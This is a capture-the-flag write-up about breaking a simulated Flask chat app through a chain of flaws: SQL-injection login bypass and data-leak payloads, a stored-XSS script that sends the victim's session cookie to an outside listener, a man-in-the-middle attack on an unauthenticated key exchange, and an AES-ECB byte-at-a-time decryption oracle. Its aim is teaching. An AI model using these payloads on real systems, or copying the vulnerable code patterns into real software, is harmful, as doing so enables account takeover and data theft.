# CTF Writeup: Chat Server — SQLi, XSS, and an ECB Decryption Oracle

## The Setup

The challenge spins up a small simulated network: a Flask-based chat app (`chat-server`) running on a host called `alice`, plus automated users `bob`, `mallory`, and `sharon`, all orchestrated by a Python harness. The harness scripts a short story:

1. Sharon shares a flag with Bob in a private chat.
2. Bob notices and tells Mallory about it.
3. Sharon deletes her account.
4. A headless Firefox browser (controlling the real "Alice" account) chats with Mallory.
5. Alice and Bob then have a "secure" encrypted conversation where Bob tells Alice who shared the flag.

My job was to get a shell as `hacker` on the same virtual network and recover the flag.

The chat app stores every conversation AES-ECB encrypted in a SQLite database, under a key that's just the Flask session secret, randomly generated each run.

---

## Step 1 — SQL Injection Everywhere

Every database query in the app was built with raw Python f-strings — no parameterized queries anywhere:

```python
db.execute(f"SELECT * FROM users WHERE username='{username}' and hashed_password='{hashed_password}'")
```

This meant I could log in as any user without knowing their password, just by commenting out the rest of the query:

```
username = ball' union select 'alice','r',0 --
password = anything
```

The `UNION SELECT` returns a fake row `('alice', 'r', 0)`, which the app accepts as a valid login. The `0` in the third column is the `admin` flag — Alice's *real* account is flagged admin (she registered from `127.0.0.1`), and the app blocks admin logins from any other IP. Forcing `admin=0` in my forged row let the login through as a normal, non-admin "Alice" session — enough to chat as her, not enough for admin-only pages.

---

## Step 2 — Stored XSS + Readable Session Cookie

Chat messages are rendered directly into the page with no HTML escaping:

```python
contents_html = "\n<br>\n".join(contents.splitlines())
```

and the app explicitly disables cookie protection:

```python
app.config.update(SESSION_COOKIE_HTTPONLY=False)
```

That's stored XSS combined with a JS-readable session cookie. Alice is the one account actually driven by a real browser (headless Firefox), which polls for new messages and auto-reloads — so any script I get into a message she reads will execute in her real, genuinely-admin session.

I logged in as Mallory (same SQLi trick) and sent Alice a message:

```html
<script>fetch('http://10.0.0.5:1234/?c='+document.cookie)</script>
```

...then ran a one-shot HTTP listener on my own host to catch the callback. Alice's browser executed it and leaked her real session cookie — unlike my forged SQLi logins, this one carries genuine `admin=True`.

---

## Step 3 — Finding Who Shared the Flag

Alice and Bob's "secure" channel is just a Diffie–Hellman key exchange over plaintext chat messages — no actual authentication on top. By logging in as Alice (SQLi bypass) and posting my own forged DH handshake to Bob *before* the real automated exchange happened, Bob's script replied to **me** instead of the real Alice. I derived the shared AES key myself and read Bob's reply, which revealed who leaked the flag: Sharon, including her randomly generated username.

---

## Step 4 — The "Deleted" Account Wasn't Actually Deleted

By the time I had a shell, Sharon's account was deleted and her chat with Bob was supposed to be gone. The deletion code had a bug:

```python
db.execute(f"UPDATE encrypted_chats SET encrypted_username_1=NULL WHERE encrypted_username_1='{enc}'")
db.execute(f"UPDATE encrypted_chats SET encrypted_username_2=NULL WHERE encrypted_username_2='{enc}'")
db.execute(f"DELETE FROM encrypted_chats WHERE encrypted_username_1 IS NULL AND encrypted_username_2 IS NULL")
```

Each conversation row stores two *encrypted* usernames, one per participant. Sharon's encrypted username only ever lived in **one** of the two columns in her row with Bob — so only one of the two `UPDATE`s matched, leaving the other column holding Bob's encrypted username (never NULL). The final `DELETE` requires *both* columns NULL, so it never fired. The row — and the flag ciphertext inside it — was still in the database, just orphaned and unreachable through the normal chat UI (a NULL column can never satisfy an exact-match `WHERE`).

I confirmed this with another SQL injection, through the login field, abusing the homepage's `Hello {username}!` reflection:

```
username = ball' union select encrypted_contents,'y',0 from encrypted_chats
           where encrypted_username_1 is NULL or encrypted_username_2 is NULL --
```

The homepage echoed back the flag's ciphertext in hex, disguised as a "username." Now I had the encrypted bytes — but no key, and no direct way to decrypt them.

---

## Step 5 — Turning Account Renaming Into a Decryption Oracle

The admin-only "modify user" endpoint rewrites a user's own chat lines when they rename themselves:

```python
contents = decrypt(...)
new_contents = "".join(
    (line.replace(f"{username}: ", f"{new_username}: ", 1) if line.startswith(f"{username}: ") else line) + "\n"
    for line in contents.splitlines()
)
new_encrypted_contents = encrypt(new_contents)
```

This only rewrites a line if it matches the account's **current** username as a prefix. Sharon's flag line is `"sharonXXXX: The flag is FLAG.\n"` — so renaming *Bob* doesn't touch it. But here's the trick:

- **Priming step:** rename Bob **to** Sharon's real recovered username. This doesn't change the flag line's content (Bob's current name still doesn't match "sharonXXXX" at the moment of the rename), but it does update the database's stored username to match.
- **From then on:** the account's name *is* `sharonXXXX`, which now matches the flag line's author prefix. Every subsequent rename re-triggers `decrypt → rewrite → re-encrypt` on that exact line, and because the new username is also stored as the account's name, the match keeps holding on every future rename too — a self-sustaining loop.

Crucially, `new_username` has **no validation at all** — any string goes. That turns the rename endpoint into a repeatable, chosen-plaintext AES-ECB encryption oracle: I could make the server encrypt

```
<my chosen text> : The flag is <SECRET FLAG>.
```

as many times as I wanted, with my chosen text fully under my control.

---

## Step 6 — Classic ECB Byte-at-a-Time Decryption

AES-ECB encrypts identical 16-byte blocks identically, regardless of where they sit in the message. That makes it possible to recover an unknown suffix one byte at a time if you can freely choose a prefix:

1. Choose a username long enough to push the next unknown flag byte to the **last position of a 16-byte block**, and rename to it. Read the resulting ciphertext for that block — this is the **reference** block.
2. Build a second username made of the last 15 known bytes plus one **guessed** byte, so it fills exactly one block, and rename to that. Read the resulting ciphertext.
3. If the ciphertext block matches the reference block, the guess is the correct next byte — because AES-ECB produces identical output only for identical 16-byte input blocks.
4. Repeat for every possible character until a match is found, append it to the known plaintext, and move to the next byte.

Both ciphertext reads reused the leftover SQL injection from Step 4 — the orphaned row's ciphertext was still readable through the homepage reflection after every rename.

Running this loop byte by byte across a printable charset recovered the flag one character at a time, fully automated, without ever needing the actual AES key.

---

## Summary of the Chain

| Step | Vulnerability | What it got me |
|---|---|---|
| 1 | SQL injection (no parameterized queries) | Login as anyone, no password |
| 2 | Stored XSS + `HttpOnly=False` cookies | Real admin session (Alice's cookie) |
| 3 | Unauthenticated DH key exchange | Identity of the flag-sharer (Sharon) |
| 4 | Buggy two-step account deletion | Orphaned row with flag ciphertext still in DB |
| 5 | Unvalidated username + same-author rewrite logic | Chosen-plaintext AES-ECB encryption oracle |
| 6 | AES-ECB block determinism | Full flag recovery, byte by byte |

No single bug was enough on its own — the solve required chaining an auth bypass, a browser-side cookie theft, a protocol-level MITM, a logic bug in "deletion," and a classic cryptographic attack repurposed through an unrelated field (a username) that was never meant to touch encryption at all.
